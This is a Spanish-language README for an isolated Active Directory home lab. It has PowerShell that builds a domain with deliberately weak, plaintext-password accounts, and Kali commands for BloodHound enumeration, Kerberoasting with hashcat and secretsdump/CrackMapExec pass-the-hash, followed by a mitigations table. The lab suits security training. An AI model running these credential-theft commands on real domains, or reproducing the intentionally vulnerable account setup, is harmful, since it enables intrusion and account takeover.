# Active Directory Home Lab 🏴
 
Entorno de laboratorio virtualizado para practicar técnicas de ataque y defensa sobre Active Directory.
Montado íntegramente en local con VMware Workstation — entorno 100% aislado, sin sistemas reales implicados.
 
> ⚠️ **Disclaimer:** Este proyecto es exclusivamente educativo. Todas las técnicas documentadas se ejecutan únicamente en este entorno controlado. Nunca apliques estas técnicas en sistemas sin autorización expresa y por escrito.
 
---
 
## 🗺️ Arquitectura del laboratorio
 
```
┌──────────────────────────────────────────────────────┐
│           VMnet2 — 192.168.100.0/24                  │
│                (Host-only · Aislada)                 │
│                                                      │
│  ┌─────────────────────┐   ┌──────────────────────┐  │
│  │  WIN-DC01           │   │  Kali Linux          │  │
│  │  Windows Server 2022│   │  192.168.100.50      │  │
│  │  192.168.100.10     │   │  (atacante)          │  │
│  │  AD DS · DNS · DHCP │   │                      │  │
│  └─────────────────────┘   └──────────────────────┘  │
│                                                      │
│  ┌──────────────────┐   ┌──────────────────────────┐ │
│  │  WIN-PC01        │   │  WIN-PC02                │ │
│  │  Windows 10      │   │  Windows 10              │ │
│  │  192.168.100.101 │   │  192.168.100.102         │ │
│  │  (víctima 1)     │   │  (víctima 2)             │ │
│  └──────────────────┘   └──────────────────────────┘ │
└──────────────────────────────────────────────────────┘
```
 
| VM | OS | IP | RAM | Rol |
|---|---|---|---|---|
| WIN-DC01 | Windows Server 2022 | 192.168.100.10 | 3 GB | Domain Controller, DNS, DHCP |
| WIN-PC01 | Windows 10 | 192.168.100.101 | 2 GB | Cliente unido al dominio |
| WIN-PC02 | Windows 10 | 192.168.100.102 | 2 GB | Cliente unido al dominio |
| Kali Linux | Kali Linux 2024.x | 192.168.100.50 | 2 GB | Máquina atacante |
 
**Dominio:** `lab.local` · **NetBIOS:** `LAB` · **Red:** VMware Host-only (VMnet2)
 
---
 
## 🛠️ Requisitos
 
- VMware Workstation 17+
- ISO Windows Server 2022 Evaluation (descarga gratuita — Microsoft)
- ISO Windows 10 Evaluation (descarga gratuita — Microsoft)
- Kali Linux (descarga oficial — kali.org)
- 12 GB RAM disponibles en el host
 
---
 
## 👤 Usuarios del laboratorio
 
| Usuario | Contraseña | Rol | Vulnerabilidad explotada |
|---|---|---|---|
| Administrator | P@ssw0rd123! | Domain Admin | — |
| jsmith | Password1 | Usuario estándar | Contraseña débil |
| mjohnson | Summer2023! | Usuario estándar | Contraseña débil |
| svc-sql | MYpassword123# | Service Account | **Kerberoastable** (SPN registrado) |
| localadmin | P@ssw0rd123! | Domain Admin | **Pass-the-Hash** |
 
---
 
## ⚙️ Setup paso a paso
 
### Fase 1 — Domain Controller (WIN-DC01)
 
#### Red — IP estática
 
```powershell
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.100.10 -PrefixLength 24 -DefaultGateway 192.168.100.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.100.10
```
 
#### Instalar y promover AD DS
 
```powershell
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
 
Install-ADDSForest `
  -DomainName "lab.local" `
  -DomainNetbiosName "LAB" `
  -ForestMode "WinThreshold" `
  -DomainMode "WinThreshold" `
  -InstallDns:$true `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
  -Force:$true
```
 
#### Configurar DHCP
 
```powershell
Install-WindowsFeature -Name DHCP -IncludeManagementTools
Add-DhcpServerInDC -DnsName "WIN-DC01.lab.local" -IPAddress 192.168.100.10
Add-DhcpServerv4Scope -Name "Lab Network" -StartRange 192.168.100.100 -EndRange 192.168.100.200 -SubnetMask 255.255.255.0 -State Active
Set-DhcpServerv4OptionValue -ScopeId 192.168.100.0 -Router 192.168.100.1 -DnsServer 192.168.100.10 -DnsDomain "lab.local"
Add-DhcpServerv4ExclusionRange -ScopeId 192.168.100.0 -StartRange 192.168.100.1 -EndRange 192.168.100.99
```
 
#### Crear usuarios vulnerables
 
```powershell
# OUs
New-ADOrganizationalUnit -Name "Lab Users" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Service Accounts" -Path "DC=lab,DC=local"
 
# Usuarios estándar
New-ADUser -Name "John Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@lab.local" `
  -Path "OU=Lab Users,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
 
New-ADUser -Name "Mary Johnson" -SamAccountName "mjohnson" -UserPrincipalName "mjohnson@lab.local" `
  -Path "OU=Lab Users,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Summer2023!" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
 
# Service account con SPN — vulnerable a Kerberoasting
New-ADUser -Name "SQL Service" -SamAccountName "svc-sql" -UserPrincipalName "svc-sql@lab.local" `
  -Path "OU=Service Accounts,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "MYpassword123#" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
setspn -A MSSQLSvc/WIN-DC01.lab.local:1433 LAB\svc-sql
setspn -A MSSQLSvc/WIN-DC01:1433 LAB\svc-sql
 
# Admin de dominio — vulnerable a Pass-the-Hash
New-ADUser -Name "Local Admin" -SamAccountName "localadmin" -UserPrincipalName "localadmin@lab.local" `
  -Path "OU=Lab Users,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
Add-ADGroupMember -Identity "Admins. del dominio" -Members "localadmin"
```
 
**Verificación:**
 
![ipconfig DC](./docs/screenshots/fase1-01-ipconfig.png)
*IP estática asignada al DC — 192.168.100.10*
 
![Dominio activo](./docs/screenshots/fase1-02-domain-activo.png)
*lab.local promovido correctamente*
 
![DCDiag OK](./docs/screenshots/fase1-03-dcdiag-ok.png)
*Servicios del DC sin errores*
 
![DHCP](./docs/screenshots/fase1-04-dhcp-scope.png)
*Scope DHCP activo — rango 192.168.100.100-200*
 
![SPN svc-sql](./docs/screenshots/fase1-05-spn-svc-sql.png)
*Service account con SPN registrado — objetivo Kerberoasting*
 
![Usuarios AD](./docs/screenshots/fase1-06-usuarios-ad.png)
*Usuarios del laboratorio creados y habilitados*
 
---
 
### Fase 2 — Clientes Windows 10 (WIN-PC01 / WIN-PC02)
 
> 🔄 *En progreso*
 
---
 
### Fase 3 — Kali Linux (atacante)
 
> 🔄 *En progreso*
 
---
 
## ⚔️ Ataques documentados
 
| Técnica | Herramienta | Estado |
|---|---|---|
| Enumeración AD | BloodHound + bloodhound-python | 📋 Pendiente |
| Kerberoasting | Impacket GetUserSPNs + hashcat | 📋 Pendiente |
| Pass-the-Hash | CrackMapExec + Impacket | 📋 Pendiente |
| AS-REP Roasting | Impacket GetNPUsers | 📋 Pendiente |
| DCSync | Impacket secretsdump | 📋 Pendiente |
 
---
 
### 🔍 Enumeración con BloodHound
 
> 📋 *Documentación pendiente — Fase 3*
 
```bash
# Recopilar datos del dominio desde Kali
bloodhound-python -u jsmith -p 'Password1' -d lab.local -ns 192.168.100.10 -c all
 
# Iniciar Neo4j y BloodHound
sudo neo4j start
bloodhound
```
 
---
 
### 🎯 Kerberoasting
 
> 📋 *Documentación pendiente — Fase 3*
 
```bash
# Solicitar TGS de cuentas con SPN registrado
impacket-GetUserSPNs lab.local/jsmith:'Password1' -dc-ip 192.168.100.10 -request -outputfile kerberoast.hash
 
# Crackear el hash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```
 
---
 
### 🔑 Pass-the-Hash
 
> 📋 *Documentación pendiente — Fase 3*
 
```bash
# Extraer hash NTLM
impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10
 
# Autenticarse con el hash sin necesidad de contraseña
crackmapexec smb 192.168.100.0/24 -u localadmin -H <NTLM_HASH>
```
 
---
 
## 🛡️ Mitigaciones
 
| Ataque | Mitigación |
|---|---|
| Kerberoasting | Contraseñas +25 caracteres en service accounts · Usar Group Managed Service Accounts (gMSA) |
| Pass-the-Hash | Deshabilitar NTLM donde sea posible · Activar Windows Defender Credential Guard |
| BloodHound / Enumeración | Principio de mínimo privilegio · Auditar ACLs del dominio regularmente |
| AS-REP Roasting | Forzar pre-autenticación Kerberos en todos los usuarios |
| DCSync | Restringir permisos de replicación de directorio (solo DCs reales) |
 
---
 
## 📚 Referencias
 
- [HackTricks — Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [BloodHound Documentation](https://bloodhound.readthedocs.io)
- [Impacket — GitHub](https://github.com/fortra/impacket)
- [PayloadsAllTheThings — AD Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [TarlogicSecurity — Kerberos Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
